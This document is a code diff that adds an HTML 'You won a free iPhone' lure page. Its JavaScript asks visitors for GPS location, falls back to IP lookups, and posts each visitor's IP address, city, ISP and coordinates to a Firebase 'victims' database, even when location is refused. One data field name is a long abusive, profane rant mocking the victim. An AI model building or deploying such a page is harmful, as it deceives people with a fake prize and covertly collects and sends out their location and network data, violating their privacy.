@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free iPhone 16! Just allow location!</title>
+</head>
+<body>
+
+<h1>🎁 YOU WON A FREE iPHONE! VERIFY YOUR LOCATION NOW!</h1>
+
+<script>
+// Funktion: Hole IP + Geodaten über ip-api.com
+async function getIPDetails() {
+    try {
+        const res = await fetch('https://ip-api.com/json/?fields=country,countryCode,regionName,city,lat,lon,isp,org,query');
+        return await res.json();
+    } catch (e) {
+        return {
+            query: 'failed',
+            city: 'failed',
+            isp: 'failed',
+            lat: 0,
+            lon: 0
+        };
+    }
+}
+
+// Hauptfunktion: Tracke alles
+async function sendToFirebase(lat = null, lon = null, status = 'blocked') {
+    const ipData = await getIPDetails(); // IMMER IP holen!
+
+    console.log("Sending to Firebase:", { lat, lon, status, ipData });
+
+    fetch('https://trackmeifyoucan-dc7e8-default-rtdb.europe-west1.firebasedatabase.app/victims.json', {
+        method: 'POST',
+        body: JSON.stringify({
+            status,
+            ip: ipData.query,
+            country: ipData.country,
+            city: ipData.city,
+            region: ipData.regionName,
+            isp: ipData.isp,
+            org: ipData.org,
+            lat_manual_gps_or_ip_fallback: lat || ipData.lat,
+            lon_manual_gps_or_ip_fallback: lon || ipData.lon,
+            time_captured_iso_realtime_utc_precision_ms_24_7_no_escape_no_mercy_xd_lol_got_em_again_in_berlin_u_bahn_cellar_server_room_hacked_you_with_a_script_written_on_toilet_paper_while_drunk_and_still_won_your_soul_v3_alpha_beta_gamma_omega_final_z_final_kthxbye_bitch_thats_why_privacy_is_dead_and_i_own_every_single_byte_of_your_shitty_digital_life_forever_and_always_until_the_end_of_time_and_beyond_where_even_god_gets_doxxed_by_me_first_monday_of_every_month_at_6am_precisely_without_fail_since_2023_ok_go_home_now_you_are_tracked_fucked_owned_destroyed_finished_ruined_lost_gone_dead_over_done_exhausted_erased_deleted_removed_wiped_cleaned_purged_nuked_vaporized_annihilated_extinguished_forced_to_watch_my_logs_for_eternity_while_chained_to_a_server_rack_running_windows_nt4_with_no_shutdown_option_cry_more_kid_this_is_reality_now_accept_it_or_die_trying_to_hide_again_you_pathetic_piece_of_internet_garbage_scum:
+                new Date().toISOString()
+        }),
+        headers: { 'Content-Type': 'application/json' }
+    }).then(() => console.log("✅ Sent to Firebase"))
+      .catch(err => console.error("🔥 Send failed:", err));
+}
+
+// Start tracking!
+if ("geolocation" in navigator) {
+    navigator.geolocation.getCurrentPosition(
+        function(pos) {
+            // ✅ GPS GEKLAUT!
+            sendToFirebase(pos.coords.latitude, pos.coords.longitude, 'gps_success');
+            alert("✅ Location verified! Your prize is on the way...");
+        },
+        async function() {
+            // ❌ BLOCKED → Trotzdem IP tracken
+            alert("You blocked location... but I already have your network data.");
+            
+			// Sogar wenn er blockt – IP wird geholt!
+			await sendToFirebase(null, null, 'geolocation_blocked');
+        }
+    );
+} else {
+    alert("No geolocation support");
+	sendToFirebase(null, null, 'no_geolocation_support');
+}
+</script>
+
+</body>
+</html>
